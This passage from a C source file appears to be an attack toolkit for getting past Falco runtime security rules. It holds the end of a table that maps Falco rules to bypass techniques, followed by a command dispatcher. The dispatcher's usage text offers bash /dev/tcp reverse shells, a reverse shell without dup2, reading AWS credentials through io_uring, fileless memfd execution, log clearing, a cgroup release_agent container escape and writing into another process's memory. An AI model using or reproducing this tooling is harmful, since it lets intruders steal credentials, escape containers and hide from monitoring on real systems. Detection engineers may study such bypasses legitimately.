          "/proc/self/status TracerPid check (no PTRACE_TRACEME)" },
        {21, "Find AWS Credentials", "WARNING",
          "io_uring OPENAT+READ (no grep/find spawned)" },
        {22, "Execution from /dev/shm", "WARNING",
          "execute from /tmp/ (no Falco rule for /tmp exec)" },
        {23, "Drop and execute new binary in container", "CRITICAL",
          "io_uring write + memfd ghost-sc (no execve)" },
        {24, "Disallowed SSH Connection Non Standard Port", "NOTICE",
          "use port not in list (2222,8888,...) or io_uring connect" },
        {25, "Fileless execution via memfd_create", "CRITICAL",
          "ghost-sc mmap (no execve) or shm-exec from /tmp" },
        {0, NULL, NULL, NULL}
    };

    for (int i = 0; rules[i].id; i++)
        printf("%-3d %-48s %-8s %s\n",
               rules[i].id, rules[i].name, rules[i].prio, rules[i].bypass);

    printf("\nTools: io_uring_falco, exe_from_memfd_bypass, proc_masquerade, ringbuf_overflow\n");
    printf("       event_storm, proc_ghost, ns_pivot, scap_unload\n");
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage: %s <command> [args...]\n\n"
            "  list                        print all 25 rules + bypass technique\n"
            "  dir-traversal <path>        rule  1: io_uring read (no openat event)\n"
            "  sensitive-read <file>       rule  3: io_uring read sensitive file\n"
            "  shell-untrusted             rule  4: spawn python3 (not in shell_binaries)\n"
            "  terminal-shell              rule  6: shell via setsid (proc.tty=0)\n"
            "  k8s-connect <ip>            rule  7: io_uring connect to K8s API\n"
            "  netcat-rce <ip> <port>      rule  8: bash /dev/tcp reverse shell\n"
            "  grep-bypass <pat> <file>    rule  9: in-process search via io_uring\n"
            "  clear-log <logfile>         rule 10: ftruncate (no O_TRUNC in openat)\n"
            "  rm-data <file>              rule 11: dd (not shred/mkfs/mke2fs)\n"
            "  symlink <target> <link>     rule 12: io_uring symlinkat\n"
            "  hardlink <old> <new>        rule 13: io_uring linkat\n"
            "  packet-socket               rule 14: io_uring socket(AF_PACKET)\n"
            "  no-dup-shell <ip> <port>    rule 15: reverse shell without dup2\n"
            "  debugfs-priv [args]         rule 17: prctl name-spoof before debugfs\n"
            "  release-agent <payload>     rule 18: io_uring write to release_agent\n"
            "  vm-write <pid> <addr> <hex> rule 19: process_vm_writev (no ptrace)\n"
            "  no-traceme                  rule 20: TracerPid check (no PTRACE_TRACEME)\n"
            "  aws-creds [path]            rule 21: io_uring read .aws/credentials\n"
            "  exec-proc <elf>             rule 22: copy+exec from /tmp (not /dev/shm)\n"
            "  ssh-safe-port <host> <port> rule 24: SSH on non-blocked port\n"
            "\nall io_uring ops require SYS_io_uring_setup (unprivileged by default)\n"
            "symlink/hardlink require kernel 5.15+; socket requires kernel 5.19+\n",
            argv[0]);
        return 1;
    }

    const char *cmd = argv[1];

    if      (!strcmp(cmd, "list"))           cmd_list();
    else if (!strcmp(cmd, "dir-traversal") && argc >= 3)
        cmd_dir_traversal(argv[2]);
    else if (!strcmp(cmd, "sensitive-read") && argc >= 3)
        cmd_sensitive_read(argv[2]);
    else if (!strcmp(cmd, "shell-untrusted"))
        cmd_shell_untrusted();
    else if (!strcmp(cmd, "terminal-shell"))
        cmd_terminal_shell();
    else if (!strcmp(cmd, "k8s-connect") && argc >= 3)
        cmd_k8s_connect(argv[2]);
    else if (!strcmp(cmd, "netcat-rce") && argc >= 4)
        cmd_netcat_rce(argv[2], atoi(argv[3]));
    else if (!strcmp(cmd, "grep-bypass") && argc >= 4)
        cmd_grep_bypass(argv[2], argv[3]);
    else if (!strcmp(cmd, "clear-log") && argc >= 3)
        cmd_clear_log(argv[2]);
    else if (!strcmp(cmd, "rm-data") && argc >= 3)
        cmd_rm_data(argv[2]);
    else if (!strcmp(cmd, "symlink") && argc >= 4)
        cmd_symlink_op(argv[2], argv[3]);
    else if (!strcmp(cmd, "hardlink") && argc >= 4)
        cmd_hardlink_op(argv[2], argv[3]);
    else if (!strcmp(cmd, "packet-socket"))
        cmd_packet_socket();
    else if (!strcmp(cmd, "no-dup-shell") && argc >= 4)
        cmd_no_dup_shell(argv[2], atoi(argv[3]));
    else if (!strcmp(cmd, "debugfs-priv"))
        cmd_debugfs_priv(argc >= 3 ? argv[2] : NULL);
    else if (!strcmp(cmd, "release-agent") && argc >= 3)
        cmd_release_agent(argv[2]);
    else if (!strcmp(cmd, "vm-write") && argc >= 5)
        cmd_vm_write((pid_t)atoi(argv[2]), strtoul(argv[3], NULL, 16), argv[4]);
    else if (!strcmp(cmd, "no-traceme"))
        cmd_no_traceme();
    else if (!strcmp(cmd, "aws-creds"))
        cmd_aws_creds(argc >= 3 ? argv[2] : NULL);
    else if (!strcmp(cmd, "exec-proc") && argc >= 3)
        cmd_exec_proc(argv[2]);
    else if (!strcmp(cmd, "ssh-safe-port") && argc >= 4)
        cmd_ssh_safe_port(argv[2], atoi(argv[3]));
    else {
        fprintf(stderr, "unknown command or missing args: %s\n", cmd);
        return 1;
    }
    return 0;
}
